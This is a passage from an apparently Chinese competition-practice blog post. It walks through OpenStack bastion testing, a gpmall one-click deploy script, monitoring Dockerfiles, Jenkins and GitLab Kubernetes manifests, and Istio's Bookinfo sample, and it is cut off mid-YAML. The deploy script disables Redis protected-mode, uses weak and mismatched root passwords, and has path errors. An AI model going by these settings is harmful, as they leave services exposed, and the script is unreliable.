<p>（8）测试连接</p>
<p>单击右上角管理员用户下拉菜单，选择“用户界面”，如图11所示：</p>
<p><img src="https://img-blog.csdnimg.cn/710a1447beb7445681332c825fa43e10.png" alt="图11 创建资产授权规则.png"></p>
<p>图11 创建资产授权规则</p>
<p>如果未出现Default项目下的资产主机，单击收藏夹后“刷新”按钮进行刷新，如图12所示：</p>
<p><img src="https://img-blog.csdnimg.cn/961fdae7c68e46efbe525d5cab17934a.png" alt="图12 查看资产.png"></p>
<p>图12 查看资产</p>
<p>单击左侧导航栏，选择“Web终端”进入远程连接页面，如图13所示：</p>
<p><img src="https://img-blog.csdnimg.cn/245f50fdd2ad4877aa2aeb3da44c9913.png" alt="图13 进入远程连接终端.png"></p>
<p>图13 进入远程连接终端</p>
<p>单击左侧Default，展开文件夹，单击controller主机，右侧成功连接主机，如图14所示：</p>
<p><img src="https://img-blog.csdnimg.cn/bf3b1559815f49bfa9a73bff930664d0.png" alt="图14 测试连接.png"></p>
<p>图14 测试连接</p>
<p>至此OpenStack对接堡垒机案例操作成功。</p>
<p>1.2.10 完成私有云平台的调优或排错工作。（本任务只公布考试范围，不公布赛题）ss</p>
<h3 id="任务3-私有云运维开发（10分）"><a href="#任务3-私有云运维开发（10分）" class="headerlink" title="*任务3 私有云运维开发（10分）*"></a><em><strong>*任务3 私有云运维开发（10分）*</strong></em></h3><p>1.3.1 编写Shell一键部署脚本</p>
<p>编写一键部署脚本，要求可以一键部署gpmall商城应用系统。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">inital hostname</span></span><br><span class="line">hostnamectl set-hostname mall</span><br><span class="line">ip=`ip a | sed -nr &quot;s/^ .*inet ([0-9].+)\/24 .*/\1/p&quot;`</span><br><span class="line">cat &gt;&gt; /etc/hosts &lt;&lt;EOF</span><br><span class="line">127.0.0.1 mysql.mall</span><br><span class="line">127.0.0.1 redis.mall</span><br><span class="line">127.0.0.1 zk1.mall</span><br><span class="line">127.0.0.1 kafka.mall</span><br><span class="line">127.0.0.1 zookeeper.mall</span><br><span class="line">EOF</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">config yum ignore</span></span><br><span class="line">mkdir /etc/yum.repos.d/repo</span><br><span class="line">mv /etc/yum.repos.d/Centos* /etc/yum.repos.d/repo</span><br><span class="line">cat &gt;&gt; /etc/yum.repos.d/local.repo &lt;&lt;EOF</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">[gpmall-repo]</span><br><span class="line">name=gpmall</span><br><span class="line">baseurl=file:///root/gpmall_allinone/gpmall-repo</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">mkdir /opt/centos</span><br><span class="line">mount /dev/cdrom /opt/centos</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">intal enviroment</span></span><br><span class="line">yum install -y java-1.8.0-openjdk*</span><br><span class="line">yum install -y redis</span><br><span class="line">yum install -y nginx</span><br><span class="line">yum install -y mariadb-server</span><br><span class="line">tar -zxvf zookeeper-3.4.14.tar.gz</span><br><span class="line">tar -zxvf kafka_2.11-1.1.1.tgz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#started zookeeper</span></span></span><br><span class="line">mv zookeeper-3.4.14/conf/zoo_sample.cfg zookeeper-3.4.14/conf/zoo.cfg</span><br><span class="line">./bin/zkServer.sh start</span><br><span class="line">echo $?</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">started kafka</span></span><br><span class="line">kafka_2.11-1.1.1/bin/kafka-server-start.sh -daemon kafka_2.11-1.1.1/config/server.properties</span><br><span class="line">echo $?</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">config mairadb</span></span><br><span class="line">mysqladmin -uroot password 123456</span><br><span class="line">mysql -uroot -p000000 -e &#x27;create database gpmall;&#x27;</span><br><span class="line">mysql -uroot -p000000 -e &#x27;use gpmall;source gpmall/gpmall.sql;&#x27;</span><br><span class="line">systemctl enable --now mariadb</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">config redis</span></span><br><span class="line">sed -i &#x27;s/bind 127.0.0.1/#bind 127.0.0.1/&#x27; /etc/redis.conf</span><br><span class="line">sed -i &#x27;s/protected-mode yes/protected-mode no/&#x27; /etc/redis.conf</span><br><span class="line">systemctl enable --now redis</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">arrange front</span></span><br><span class="line">rm -rf /usr/share/nginx/html/*</span><br><span class="line">cp -rvf gpmall/dist/* /usr/share/nginx/html/</span><br><span class="line">rm -rf /etc/nginx/conf.d/default.conf</span><br><span class="line">cp -rvf gpmall/default.conf /etc/nginx/conf.d/default.conf</span><br><span class="line">systemctl restart nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">jar jar</span></span><br><span class="line">cd gpmall</span><br><span class="line">nohup java -jar shopping-provider-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line">sleep 2</span><br><span class="line">nohup java -jar user-provider-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line">sleep 1</span><br><span class="line">nohup java -jar gpmall-shopping-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line">sleep 1</span><br><span class="line">nohup java -jar gpmall-user-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#可能kafka和zookeeper起不来重启即可</span></span></span><br></pre></td></tr></table></figure>



<p>1.3.2  Ansible部署FTP服务</p>
<p>编写Ansible脚本，部署FTP服务。</p>
<p>1.3.3  Ansible部署Kafka服务</p>
<p>编写Playbook，部署的ZooKeeper和Kafka。</p>
<p>1.3.4 编写OpenStack容器云平台自动化运维工具。（本任务只公布考试范围，不公布赛题）</p>
<h2 id="模块二-容器云（30分）"><a href="#模块二-容器云（30分）" class="headerlink" title="模块二 容器云（30分）"></a><strong>模块二 容器云（30分）</strong></h2><p>企业构建Kubernetes容器云集群，引入KubeVirt实现OpenStack到Kubernetes的全面转型，用Kubernetes来管一切虚拟化运行时，包含裸金属、VM、容器。同时研发团队决定搭建基于Kubernetes 的CI&#x2F;CD环境，基于这个平台来实现DevOps流程。引入服务网格Istio，实现业务系统的灰度发布，治理和优化公司各种微服务，并开发自动化运维程序。</p>
<h3 id="任务1-容器云服务搭建（5分）"><a href="#任务1-容器云服务搭建（5分）" class="headerlink" title="任务1 容器云服务搭建（5分）"></a><strong>任务1 容器云服务搭建（5分）</strong></h3><p>2.1.1 部署容器云平台</p>
<p>使用OpenStack私有云平台创建两台云主机，分别作为Kubernetes集群的master节点和node节点，然后完成Kubernetes集群的部署，并完成Istio服务网格、KubeVirt虚拟化和Harbor镜像仓库的部署。</p>
<h3 id="任务2-容器云服务运维（15分）"><a href="#任务2-容器云服务运维（15分）" class="headerlink" title="任务2 容器云服务运维（15分）"></a><strong>任务2 容器云服务运维（15分）</strong></h3><p>2.2.1 容器化部署Node-Exporter</p>
<p>编写Dockerfile文件构建exporter镜像，要求基于centos完成Node-Exporter服务的安装与配置，并设置服务开机自启。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将安装包上传到指定目录</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编写Dockerfile文件</span></span><br><span class="line">[root@k8s-master-node1 node-export]# cat Dockerfile</span><br><span class="line">FROM centos:7</span><br><span class="line">WORKDIR /opt</span><br><span class="line">COPY node_exporter-1.3.1.linux-amd64.tar.gz /opt</span><br><span class="line">RUN tar -zxvf node_exporter-1.3.1.linux-amd64.tar.gz -C /opt</span><br><span class="line">EXPOSE 9100</span><br><span class="line">CMD [&quot;/opt/node_exporter-1.3.1.linux-amd64/node_exporter&quot;]</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>2.2.2 容器化部署Alertmanager</p>
<p>编写Dockerfile文件构建alert镜像，要求基于centos：latest完成Alertmanager服务的安装与配置，并设置服务开机自启。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将安装包上传到指定目录</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编写Dockerfile文件</span></span><br><span class="line">[root@k8s-master-node1 alertmanager]# cat Dockerfile</span><br><span class="line">FROM centos:7</span><br><span class="line">WORKDIR /opt</span><br><span class="line">COPY alertmanager-0.21.0.linux-amd64.tar.gz /opt</span><br><span class="line">RUN tar -zxvf alertmanager-0.21.0.linux-amd64.tar.gz -C /opt</span><br><span class="line">EXPOSE 9093</span><br><span class="line">CMD [&quot;/opt/alertmanager-0.21.0.linux-amd64/alertmanager&quot;,&quot;--config.file=/opt/alertmanager-0.21.0.linux-amd64/alertmanager.yml&quot;]</span><br></pre></td></tr></table></figure>



<p>2.2.3 容器化部署Grafana</p>
<p>编写Dockerfile文件构建grafana镜像，要求基于centos完成Grafana服务的安装与配置，并设置服务开机自启。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将安装包上传到指定目录 ,若联网则忽略,本实验联网</span></span><br><span class="line">[root@k8s-master-node1 grafana]# cat Dockerfile</span><br><span class="line">FROM centos:7</span><br><span class="line">WORKDIR /opt</span><br><span class="line">COPY grafana-8.1.2-1.x86_64.rpm /opt</span><br><span class="line">RUN yum install -y fontconfig urw-fonts grafana</span><br><span class="line">CMD [&quot;grafana-server&quot;,&quot;--config /etc/sysconfig/grafana-server&quot;,&quot;--homepath /usr/share/grafana&quot;]</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>2.2.4 容器化部署Prometheus</p>
<p>编写Dockerfile文件构建prometheus镜像，要求基于centos完成Promethues服务的安装与配置，并设置服务开机自启。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将安装包上传到指定目录</span></span><br><span class="line">[root@k8s-master-node1 prometheus]# cat</span><br><span class="line">Dockerfile                            prometheus-2.37.0.linux-amd64.tar.gz  prometheus.yml</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编写Dockerfile文件</span></span><br><span class="line">Dockerfile  prometheus-2.37.0.linux-amd64.tar.gz  prometheus.yml</span><br><span class="line">[root@k8s-master-node1 prometheus]# cat Dockerfile</span><br><span class="line">FROM centos:7</span><br><span class="line">WORKDIR /opt</span><br><span class="line">COPY prometheus-2.37.0.linux-amd64.tar.gz /opt</span><br><span class="line">RUN tar zxvf prometheus-2.37.0.linux-amd64.tar.gz -C /opt</span><br><span class="line">COPY prometheus.yml /opt/prometheus-2.37.0.linux-amd64/prometheus.yml</span><br><span class="line">EXPOSE 9090</span><br><span class="line">CMD [&quot;/opt/prometheus-2.37.0.linux-amd64/prometheus&quot;]</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>2.2.5 编排部署监控系统</p>
<p>编写docker-compose.yaml文件，使用镜像exporter、alert、grafana和prometheus完成监控系统的编排部署。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@k8s-master-node1 monitor]# cat docker-compose.yml</span><br><span class="line">version: &quot;3&quot;</span><br><span class="line">services:</span><br><span class="line">  prometheus:</span><br><span class="line">    image: prometheus:v1</span><br><span class="line">    ports:</span><br><span class="line">      - 9090:9090</span><br><span class="line">  node_export:</span><br><span class="line">    image: node_exporter:v1</span><br><span class="line">    ports:</span><br><span class="line">      - 9100:9100</span><br><span class="line">    depends_on:</span><br><span class="line">      - prometheus</span><br><span class="line">  grafana:</span><br><span class="line">    image: grafana:v1</span><br><span class="line">    ports:</span><br><span class="line">      - 3000:3000</span><br><span class="line">    depends_on:</span><br><span class="line">      - prometheus</span><br><span class="line">  alertmanager:</span><br><span class="line">    image: 7e39952d313b</span><br><span class="line">    ports:</span><br><span class="line">      - 9103:9103</span><br><span class="line">    depends_on:</span><br><span class="line">      - prometheus</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>2.2.6 安装Jenkins</p>
<p>将Jenkins部署到default命名空间下。要求完成离线插件的安装，设置Jenkins的登录信息和授权策略。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建serviceAccount,授权角色</span></span><br><span class="line">[root@k8s-master-node1 jenkins]# cat rbac.yml</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  name: jenkins</span><br><span class="line">---</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: Role</span><br><span class="line">metadata:</span><br><span class="line">  name: jenkins</span><br><span class="line">rules:</span><br><span class="line">- apiGroups:</span><br><span class="line">  - &quot;&quot;</span><br><span class="line">  resources:</span><br><span class="line">  - pods</span><br><span class="line">  - events</span><br><span class="line">  verbs:</span><br><span class="line">  - get</span><br><span class="line">  - list</span><br><span class="line">  - watch</span><br><span class="line">  - create</span><br><span class="line">  - update</span><br><span class="line">  - delete</span><br><span class="line">- apiGroups:</span><br><span class="line">  - &quot;&quot;</span><br><span class="line">  resources:</span><br><span class="line">  - pods/exec</span><br><span class="line">  verbs:</span><br><span class="line">  - get</span><br><span class="line">  - list</span><br><span class="line">  - watch</span><br><span class="line">  - create</span><br><span class="line">  - update</span><br><span class="line">  - delete</span><br><span class="line">- apiGroups:</span><br><span class="line">  - &quot;&quot;</span><br><span class="line">  resources:</span><br><span class="line">  - pods/log</span><br><span class="line">  verbs:</span><br><span class="line">  - get</span><br><span class="line">  - list</span><br><span class="line">  - watch</span><br><span class="line">  - create</span><br><span class="line">  - update</span><br><span class="line">  - delete</span><br><span class="line">- apiGroups:</span><br><span class="line">  - &quot;&quot;</span><br><span class="line">  resources:</span><br><span class="line">  - secrets,events</span><br><span class="line">  verbs:</span><br><span class="line">  - get</span><br><span class="line">---</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: RoleBinding</span><br><span class="line">metadata:</span><br><span class="line">  name: jenkins</span><br><span class="line">roleRef:</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: Role</span><br><span class="line">  name: jenkins</span><br><span class="line">subjects:</span><br><span class="line">- kind: ServiceAccount</span><br><span class="line">  name: jenkins</span><br><span class="line">  namespace: default</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编写deploymen文件</span></span><br><span class="line">[root@k8s-master-node1 jenkins]# cat jenkins-deploy.yaml</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    app: jenkins</span><br><span class="line">  name: jenkins</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: jenkins</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: jenkins</span><br><span class="line">    spec:</span><br><span class="line">      serviceAccountName: jenkins</span><br><span class="line">      containers:</span><br><span class="line">      - image: jenkins/jenkins</span><br><span class="line">        name: jenkins</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 8080</span><br><span class="line">        - containerPort: 50000</span><br><span class="line">        env:</span><br><span class="line">        - name: JAVA_OPTS</span><br><span class="line">          value: -Djava.util.logging.config.file=/var/jenkins_home/log.properties</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - name: jenkins-home</span><br><span class="line">          mountPath: /var/jenkins_home</span><br><span class="line">      volumes:</span><br><span class="line">      - name: jenkins-home</span><br><span class="line">        hostPath:</span><br><span class="line">          path: /var/jenkins_home  ##注意改权限777 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建svc,暴露端口</span></span><br><span class="line">[root@k8s-master-node1 jenkins]# cat jenkins-svc.yaml</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    app: jenkins</span><br><span class="line">  name: jenkins</span><br><span class="line">spec:</span><br><span class="line">  ports:</span><br><span class="line">  - port: 80</span><br><span class="line">    name: http</span><br><span class="line">    protocol: TCP</span><br><span class="line">    targetPort: 8080</span><br><span class="line">  - port: 5000</span><br><span class="line">    name: agent</span><br><span class="line">    protocol: TCP</span><br><span class="line">  selector:</span><br><span class="line">    app: jenkins</span><br><span class="line">  type: NodePort</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>若插件获取失败,可通过修改&#x2F;etc&#x2F;resove.conf 修改后重启jenkins</p>
</blockquote>
<p>2.2.7 安装GitLab</p>
<p>将GitLab部署到default命名空间下，要求设置root用户密码，新建公开项目，并将提供的代码上传到该项目。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">部署deploy文件</span></span><br><span class="line">[root@k8s-master-node1 gitlab]# cat gitlab-deploy.yaml</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    app: gitlab</span><br><span class="line">  name: gitlab</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: gitlab</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: gitlab</span><br><span class="line">    spec:</span><br><span class="line">      nodeName: k8s-master-node1</span><br><span class="line">      containers:</span><br><span class="line">      - image: gitlab/gitlab-ce</span><br><span class="line">        name: gitlab</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 80</span><br><span class="line">        - containerPort: 22</span><br><span class="line">        - containerPort: 443</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - name: gitlab-config</span><br><span class="line">          mountPath: /etc/gitlab</span><br><span class="line">        - name: gitlab-logs</span><br><span class="line">          mountPath: /var/log/gitlab</span><br><span class="line">        - name: gitlab-data</span><br><span class="line">          mountPath: /var/opt/gitlab</span><br><span class="line">      volumes:</span><br><span class="line">      - name: gitlab-config</span><br><span class="line">        hostPath:</span><br><span class="line">          path: /data/gitlab/config</span><br><span class="line">      - name: gitlab-logs</span><br><span class="line">        hostPath:</span><br><span class="line">          path: /data/gitlab/logs</span><br><span class="line">      - name: gitlab-data</span><br><span class="line">        hostPath:</span><br><span class="line">          path: /data/gitlab/data</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">部署svc服务,暴露端口</span></span><br><span class="line">[root@k8s-master-node1 gitlab]# cat gitlab-svc.yaml</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: gitlab-svc</span><br><span class="line">spec:</span><br><span class="line">  ports:</span><br><span class="line">  - port: 80</span><br><span class="line">    targetPort: 80</span><br><span class="line">    nodePort: 30001</span><br><span class="line">  selector:</span><br><span class="line">    app: gitlab</span><br><span class="line">  type: NodePort</span><br><span class="line">  </span><br><span class="line">  </span><br></pre></td></tr></table></figure>



<p>2.2.8 配置Jenkins连接GitLab</p>
<p>在Jenkins中新建流水线任务，配置GitLab连接Jenkins，并完成WebHook的配置。</p>
<p>2.2.9 构建CI&#x2F;CD</p>
<p>在流水线任务中编写流水线脚本，完成后触发构建，要求基于GitLab中的项目自动完成代码编译、镜像构建与推送、并自动发布服务到Kubernetes集群中。</p>
<p>2.2.10 服务网格：创建Ingress Gateway</p>
<p>将Bookinfo应用部署到default命名空间下，请为Bookinfo应用创建一个网关，使外部可以访问Bookinfo应用。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进行istio注入</span></span><br><span class="line">kubectl label namespace default istio-injection=enabled</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Bookinfo部署</span></span><br><span class="line">[root@k8s-master-node1 istio-1.13.4]# cat samples/bookinfo/platform/kube/bookinfo.yaml</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright Istio Authors</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#   Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  you may not use this file except <span class="keyword">in</span> compliance with the License.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  You may obtain a copy of the License at</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#       http://www.apache.org/licenses/LICENSE-2.0</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#   Unless required by applicable law or agreed to in writing, software</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  distributed under the License is distributed on an <span class="string">&quot;AS IS&quot;</span> BASIS,</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  See the License <span class="keyword">for</span> the specific language governing permissions and</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  limitations under the License.</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#################################################################################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This file defines the services, service accounts, and deployments <span class="keyword">for</span> the Bookinfo sample.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># To apply all 4 Bookinfo services, their corresponding service accounts, and deployments:</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#   kubectl apply -f samples/bookinfo/platform/kube/bookinfo.yaml</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Alternatively, you can deploy any resource separately:</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#   kubectl apply -f samples/bookinfo/platform/kube/bookinfo.yaml -l service=reviews # reviews Service</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  kubectl apply -f samples/bookinfo/platform/kube/bookinfo.yaml -l account=reviews <span class="comment"># reviews ServiceAccount</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  kubectl apply -f samples/bookinfo/platform/kube/bookinfo.yaml -l app=reviews,version=v3 <span class="comment"># reviews-v3 Deployment</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#################################################################################################</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#################################################################################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Details service</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#################################################################################################</span></span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: details</span><br><span class="line">  labels:</span><br><span class="line">    app: details</span><br><span class="line">    service: details</span><br><span class="line">spec:</span><br><span class="line">  ports:</span><br><span class="line">  - port: 9080</span><br><span class="line">    name: http</span><br><span class="line">  selector:</span><br><span class="line">    app: details</span><br><span class="line">---</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  name: bookinfo-details</span><br><span class="line">  labels:</span><br><span class="line">    account: details</span><br><span class="line">---</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: details-v1</span><br><span class="line">  labels:</span><br><span class="line">    app: details</span><br><span class="line">    version: v1</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: details</span><br><span class="line">      version: v1</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: details</span><br><span class="line">        version: v1</span><br><span class="line">    spec:</span><br><span class="line">      serviceAccountName: bookinfo-details</span><br><span class="line">      containers:</span><br><span class="line">      - name: details</span><br><span class="line">        image: docker.io/istio/examples-bookinfo-details-v1:1.16.2</span><br><span class="line">        imagePullPolicy: IfNotPresent</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 9080</span><br><span class="line">        securityContext:</span><br><span class="line">          runAsUser: 1000</span><br><span class="line">---</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#################################################################################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ratings service</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#################################################################################################</span></span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: ratings</span><br><span class="line">  labels:</span><br><span class="line">    app: ratings</span><br><span class="line">    service: ratings</span><br><span class="line">spec:</span><br><span class="line">  ports:</span><br><span class="line">  - port: 9080</span><br><span class="line">    name: http</span><br><span class="line">  selector:</span><br><span class="line">    app: ratings</span><br><span class="line">---</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  name: bookinfo-ratings</span><br><span class="line">  labels:</span><br><span class="line">    account: ratings</span><br><span class="line">---</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: ratings-v1</span><br><span class="line">  labels:</span><br><span class="line">    app: ratings</span><br><span class="line">    version: v1</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: ratings</span><br><span class="line">      version: v1</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: ratings</span><br><span class="line">        version: v1</span><br><span class="line">    spec:</span><br><span class="line">      serviceAccountName: bookinfo-ratings</span><br><span class="line">      containers:</span><br><span class="line">      - name: ratings</span><br><span class="line">        image: docker.io/istio/examples-bookinfo-ratings-v1:1.16.2</span><br><span class="line">        imagePullPolicy: IfNotPresent</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 9080</span><br><span class="line">        securityContext:</span><br><span class="line">          runAsUser: 1000</span><br><span class="line">---</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#################################################################################################</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Reviews service</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#################################################################################################</span></span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: reviews</span><br><span class="line">  labels:</span><br><span class="line">    app: reviews</span><br><span class="line">    service: reviews</span><br><span class="line">spec:</span><br><span class="line">  ports:</span><br><span class="line">  - port: 9080</span><br><span class="line">    name: http</span><br><span class="line">  selector:</span><br><span class="line">    app: reviews</span><br><span class="line">---</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  name: bookinfo-reviews</span><br><span class="line">  labels:</span><br><span class="line">    account: reviews</span><br><span class="line">---</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: reviews-v1</span><br><span class="line">  labels:</span><br><span class="line">    app: reviews</span><br><span class="line">    version: v1</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: reviews</span><br><span class="line">      version: v1</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: reviews</span><br><span class="line">        version: v1</span><br><span class="line">    spec:</span><br><span class="line">      serviceAccountName: bookinfo-reviews</span><br><span class="line">      containers:</span><br><span class="line">      - name: reviews</span><br><span class="line">        image: docker.io/istio/examples-bookinfo-reviews-v1:1.16.2</span><br><span class="line">        imagePullPolicy: IfNotPresent</span><br><span class="line">        env:</span><br><span class="line">        - name: LOG_DIR</span><br><span class="line">          value: &quot;/tmp/logs&quot;</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 9080</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - name: tmp</span><br><span class="line">          mountPath: 